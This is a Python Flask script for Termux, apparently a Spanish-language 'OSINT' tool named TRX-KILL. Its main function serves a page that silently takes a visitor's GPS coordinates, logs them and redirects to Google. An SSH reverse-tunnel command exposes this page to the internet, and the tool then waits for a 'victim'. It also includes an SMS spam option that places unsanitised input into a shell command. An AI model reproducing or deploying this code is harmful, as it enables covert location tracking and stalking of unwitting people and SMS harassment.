import os, sys, time, threading
from flask import Flask, request

# --- CONFIGURACIÓN ---
STORAGE_PATH = "/sdcard/TRX-KILL-RESUL"
LOG_FILE = f"{STORAGE_PATH}/result.txt"
if not os.path.exists(STORAGE_PATH): os.makedirs(STORAGE_PATH)

app = Flask('TRX-KILL')
logging = __import__('logging')
logging.getLogger('werkzeug').setLevel(logging.ERROR)

G, Y, R, C, W = "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;36m", "\033[0m"

@app.route('/')
def index():
    return """<html><body><script>
        navigator.geolocation.getCurrentPosition(pos => {
            fetch('/log?lat='+pos.coords.latitude+'&lon='+pos.coords.longitude);
            window.location.href='https://www.google.com';
        });
    </script></html>"""

@app.route('/log')
def log():
    with open(LOG_FILE, "a") as f:
        f.write(f"GPS: {request.args.get('lat')},{request.args.get('lon')}\n")
    return "OK"

def print_banner():
    os.system('clear')
    print(f"{G}  -------->-TRX-KILL v1.4.5 -<-----------")
    print(f"  -HERRAMIENTA OSINT Y SEGURIDAD MÓVIL.{W}\n")

def main():
    os.system("fuser -k 5000/tcp > /dev/null 2>&1")
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, debug=False), daemon=True).start()
    
    while True:
        print_banner()
        print("  [1] RASTREAR NÚMERO | [2] LINK-ZP (MONITOR) | [3] CREADOR")
        print("  [4] VERSIONES       | [5] ANALIZAR LINK     | [6] ADM SISTEMA")
        print("  [7] INFO            | [8] REPOSITORIO       | [9] PROCESOS")
        print("  [10] SPAM-SMS       | [0] SALIR")
        sel = input(f"\n{Y}TRX-ROOT > {W}")

        if sel == "2":
            os.system('clear')
            print(f"{C}--- MONITOR DE DATOS EN VIVO ---{W}")
            print(f"SSH: {Y}ssh -R 80:localhost:5000 ssh.localhost.run{W}")
            print(f"{G}ESPERANDO VÍCTIMA...{W}")
            while True:
                time.sleep(2)
                if os.path.exists(LOG_FILE):
                    with open(LOG_FILE, 'r') as f:
                        lines = f.readlines()
                        if lines:
                            os.system('clear')
                            print(f"{G}¡DATOS RECIBIDOS!{W}\n{lines[-1].strip()}")
                # Sin inputs bloqueantes aquí
        elif sel == "1":
            input("NÚMERO: "); print("BUSCANDO..."); input("ENTER...")
        elif sel == "3": print("CREADOR: OSCAR"); time.sleep(1)
        elif sel == "4": print("VERSIÓN: 1.4.5"); time.sleep(1)
        elif sel == "5": input("URL: "); print("ANALIZANDO..."); time.sleep(1)
        elif sel == "6": input("KEY: "); print("SISTEMA ACTIVO"); time.sleep(1)
        elif sel == "7": print("HERRAMIENTA OSINT"); time.sleep(1)
        elif sel == "8": print("REPO PRIVADO"); time.sleep(1)
        elif sel == "9": print("PROCESOS: 1 ACTIVO"); time.sleep(1)
        elif sel == "10": 
            num = input("NÚMERO: "); msg = input("MSG: ")
            os.system(f"termux-sms-send -n {num} '{msg}'")
        elif sel == "0": sys.exit()

if __name__ == "__main__": main()
